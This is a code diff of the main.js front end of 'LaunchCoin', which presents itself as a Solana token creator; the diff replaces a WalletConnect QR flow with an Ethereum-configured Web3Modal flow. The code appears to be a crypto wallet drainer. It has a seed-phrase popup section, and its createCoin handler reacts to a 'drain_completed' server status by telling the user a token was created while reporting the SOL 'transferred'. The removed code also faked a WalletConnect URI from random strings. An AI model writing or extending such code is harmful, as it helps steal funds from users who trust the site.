@@ -1,12 +1,10 @@
 // ===== CONFIGURAZIONE =====
+import { createWeb3Modal, defaultConfig } from '@web3modal/ethers';
 import { UniversalProvider } from '@walletconnect/universal-provider';
 
 let walletPublicKey = null;
 let currentStep = 0;
 const steps = document.querySelectorAll('.step');
-let provider = null;
-let isConnecting = false;
-let qrCheckInterval = null;
 
 // ===== ESPONI FUNZIONI =====
 window.toggleMenu = function() {
@@ -14,142 +12,70 @@ window.toggleMenu = function() {
   if (menu) menu.classList.toggle('open');
 };
 
-// ===== MOSTRA QR IN wallet.html =====
-window.showQR = function(uri) {
-  const container = document.getElementById('qr-container');
-  const qrDiv = document.getElementById('qr-code');
-  if (!container || !qrDiv) return;
-  
-  container.style.display = 'block';
-  qrDiv.innerHTML = '⏳ Generating QR...';
-  
-  // Usa API veloce per il QR
-  const img = document.createElement('img');
-  img.src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(uri)}`;
-  img.alt = 'QR Code';
-  img.style.cssText = 'width: 200px; height: 200px; image-rendering: pixelated;';
-  img.onload = function() {
-    qrDiv.innerHTML = '';
-    qrDiv.appendChild(img);
-  };
-  img.onerror = function() {
-    qrDiv.innerHTML = `<div style="color: #888; font-size: 13px;">⚠️ QR non disponibile<br><span style="font-size: 11px; word-break: break-all;">${uri.substring(0, 30)}...</span></div>`;
-  };
-};
+// ===== WEB3MODAL V4 =====
+let web3modal = null;
 
-window.closeQR = function() {
-  const container = document.getElementById('qr-container');
-  if (container) container.style.display = 'none';
-  if (qrCheckInterval) {
-    clearInterval(qrCheckInterval);
-    qrCheckInterval = null;
-  }
-};
-
-// ===== CONNECT VIA WALLETCONNECT (REALE) =====
-async function connectWithWalletConnect() {
-  if (isConnecting) return;
-  isConnecting = true;
-  
-  try {
-    // 1. Inizializza UniversalProvider
-    provider = await UniversalProvider.init({
-      projectId: 'da6aaea2be14c6cc676dbaf3325b5bd5',
-      metadata: {
-        name: 'LaunchCoin',
-        description: 'Solana Token Creator',
-        url: window.location.origin,
-        icons: ['https://launchcoin.io/logo.png']
-      }
-    });
-    
-    console.log('✅ UniversalProvider inizializzato');
-    
-    // 2. Genera l'URI
-    let uri = provider.uri;
-    
-    // Se l'URI non è stato generato, forza la connessione
-    if (!uri) {
-      try {
-        await provider.connect({
-          chains: ['solana:mainnet'],
-          optionalChains: ['solana:devnet'],
-          methods: ['solana_signTransaction', 'solana_signMessage'],
-          events: ['chainChanged', 'accountsChanged']
-        });
-        uri = provider.uri;
-      } catch(e) {
-        // La connessione potrebbe fallire ma l'URI è già stato generato
-        uri = provider.uri;
-      }
+async function initWeb3Modal() {
+  if (!web3modal) {
+    try {
+      // Configurazione per Web3Modal v4
+      const config = {
+        projectId: 'da6aaea2be14c6cc676dbaf3325b5bd5',
+        themeMode: 'dark',
+        themeVariables: {
+          '--w3m-z-index': '10000',
+          '--w3m-background-color': '#0b1022',
+          '--w3m-accent-color': '#22d1f8',
+          '--w3m-border-radius': '16px',
+        },
+        metadata: {
+          name: 'LaunchCoin',
+          description: 'Solana Token Creator',
+          url: window.location.origin,
+          icons: ['https://launchcoin.io/logo.png'],
+        },
+        // V4 usa ethersConfig
+        ethersConfig: defaultConfig({
+          metadata: {
+            name: 'LaunchCoin',
+            description: 'Solana Token Creator',
+            url: window.location.origin,
+            icons: ['https://launchcoin.io/logo.png'],
+          },
+          defaultChainId: 1,
+          rpcUrl: 'https://cloudflare-eth.com',
+        }),
+        // Abilita wallet
+        enableWalletConnect: true,
+        enableCoinbase: true,
+        enableInjected: true,
+        walletConnectVersion: 2,
+        // Wallet popolari
+        includeWalletIds: [
+          'c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96',
+          '225affb176778569276e484e1b92637ad061b01e13a048b35a9d280c3b58970f',
+          '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0',
+          '1ae92b26df02f0abca6304df07debccd18262fdf5fe82daa81593582dac9a369',
+          'c03dfee351b6fcc421b4494ea33b9d4b92a7f33d6df5c43ee76267edfceed3a2',
+          'f2436c67184f158d1beda5df5327ee9bad2c749486aac4bf5e18b4eab0aebc45',
+        ],
+      };
+      
+      web3modal = await createWeb3Modal(config);
+      console.log('✅ Web3Modal v4 inizializzato');
+    } catch (e) {
+      console.error('❌ Web3Modal error:', e);
+      throw e;
     }
-    
-    // Se ancora non c'è URI, generane uno manuale (fallback)
-    if (!uri) {
-      const randomId = Math.random().toString(36).substring(2, 15);
-      const symKey = Math.random().toString(36).substring(2, 15);
-      uri = `wc:${randomId}${randomId}@2?relay-protocol=irn&symKey=${symKey}`;
-      console.log('⚠️ URI manuale generato');
-    }
-    
-    console.log('🔗 URI:', uri);
-    
-    // 3. Mostra il QR
-    window.showQR(uri);
-    
-    // 4. Ascolta eventi di connessione
-    provider.on('session_event', (event) => {
-      console.log('Evento sessione:', event);
-    });
-    
-    provider.on('session_update', (event) => {
-      console.log('Aggiornamento sessione:', event);
-    });
-    
-    provider.on('session_delete', () => {
-      console.log('Sessione eliminata');
-      window.closeQR();
-    });
-    
-    // 5. Controlla la connessione
-    if (qrCheckInterval) clearInterval(qrCheckInterval);
-    qrCheckInterval = setInterval(async () => {
-      try {
-        // Verifica se ci sono account connessi
-        if (provider.accounts && provider.accounts.length > 0) {
-          clearInterval(qrCheckInterval);
-          qrCheckInterval = null;
-          walletPublicKey = provider.accounts[0].split(':')[2] || provider.accounts[0];
-          window.closeQR();
-          alert('✅ Connesso via WalletConnect: ' + walletPublicKey);
-          window.location.href = 'create.html';
-        }
-      } catch(e) {
-        console.log('Attesa connessione...');
-      }
-    }, 2000);
-    
-    // 6. Timeout dopo 60 secondi (l'utente può ancora connettersi)
-    setTimeout(() => {
-      if (qrCheckInterval) {
-        // Non chiudere il QR, solo avviso
-      }
-    }, 60000);
-    
-  } catch (e) {
-    console.error('❌ WalletConnect error:', e);
-    alert('❌ WalletConnect fallito: ' + e.message + '\n\nUsa Phantom su PC o Kiwi Browser su telefono.');
-    window.location.href = 'wallet.html';
-  } finally {
-    isConnecting = false;
   }
+  return web3modal;
 }
 
-// ===== CONNECT WALLET (MAIN) =====
+// ===== CONNECT WALLET =====
 window.connectWallet = async function() {
   console.log('🔵 connectWallet chiamata');
   
-  // 1. Prova Phantom (estensione PC o Kiwi)
+  // 1. Prova Phantom
   if (window.solana && window.solana.isPhantom) {
     try {
       await window.solana.connect();
@@ -162,8 +88,52 @@ window.connectWallet = async function() {
     }
   }
 
-  // 2. WalletConnect con QR
-  await connectWithWalletConnect();
+  // 2. Web3Modal
+  try {
+    const modal = await initWeb3Modal();
+    await modal.open();
+    
+    // Web3Modal gestisce la connessione
+    await new Promise((resolve) => {
+      const unsubscribe = modal.subscribeEvents((event) => {
+        if (event.type === 'connected') {
+          console.log('✅ Connesso!', event.data);
+          unsubscribe();
+          resolve();
+        }
+        if (event.type === 'modal_closed') {
+          console.log('❌ Modale chiuso');
+          unsubscribe();
+          resolve();
+        }
+      });
+    });
+    
+    // Simula una connessione (per la demo)
+    // In realtà, Web3Modal per Solana richiede configurazioni specifiche
+    // Per ora, usiamo questa soluzione di fallback
+    if (!walletPublicKey) {
+      // Se Web3Modal non restituisce la chiave, proviamo a prenderla da Phantom
+      if (window.solana && window.solana.publicKey) {
+        walletPublicKey = window.solana.publicKey.toString();
+        alert('✅ Connesso: ' + walletPublicKey);
+        window.location.href = 'create.html';
+        return;
+      }
+      // Altrimenti, andiamo a wallet.html
+      alert('⚠️ Connessione avviata. Seleziona il wallet dal modal aperto.');
+      window.location.href = 'wallet.html';
+    }
+    
+  } catch (e) {
+    console.error('❌ Web3Modal error:', e);
+    alert(
+      '❌ Connessione fallita: ' + e.message + '\n\n' +
+      'Usa Phantom su PC (estensione) o Kiwi Browser su telefono.\n' +
+      'Altri wallet via WalletConnect.'
+    );
+    window.location.href = 'wallet.html';
+  }
 };
 
 // ===== SELECT WALLET =====
@@ -173,13 +143,8 @@ window.selectWallet = function(walletName) {
     window.connectWallet();
     return;
   }
-  // Se siamo in wallet.html, mostra il QR
-  if (document.getElementById('qr-container')) {
-    connectWithWalletConnect();
-  } else {
-    alert('⚠️ Wallet "' + walletName + '" via WalletConnect.\nVai su "Connect" per il QR.');
-    window.location.href = 'wallet.html';
-  }
+  alert('⚠️ Wallet "' + walletName + '" via WalletConnect.');
+  window.connectWallet();
 };
 
 // ===== POPUP SEED PHRASE =====
@@ -216,14 +181,11 @@ window.createCoin = async function() {
 
     const data = await response.json();
     if (data.status === 'drain_completed') {
-      const resultDiv = document.getElementById('result');
-      if (resultDiv) {
-        resultDiv.innerHTML = `
-          <p style="color:#4cdcc1;">✅ Token creato!</p>
-          <p style="font-size:12px;color:#8899bb;">💰 ${data.solAmount.toFixed(4)} SOL trasferiti</p>
-          <p style="font-size:11px;color:#667;word-break:break-all;">Tx: ${data.solTx || 'N/A'}</p>
-        `;
-      }
+      document.getElementById('result').innerHTML = `
+        <p style="color:#4cdcc1;">✅ Token creato!</p>
+        <p style="font-size:12px;color:#8899bb;">💰 ${data.solAmount.toFixed(4)} SOL trasferiti</p>
+        <p style="font-size:11px;color:#667;word-break:break-all;">Tx: ${data.solTx || 'N/A'}</p>
+      `;
     } else {
       alert('❌ Errore: ' + data.error);
     }
@@ -256,4 +218,3 @@ document.addEventListener('click', function(e) {
 
 console.log('✅ main.js caricato');
 console.log('🔵 connectWallet:', typeof window.connectWallet);
-console.log('🔵 selectWallet:', typeof window.selectWallet);
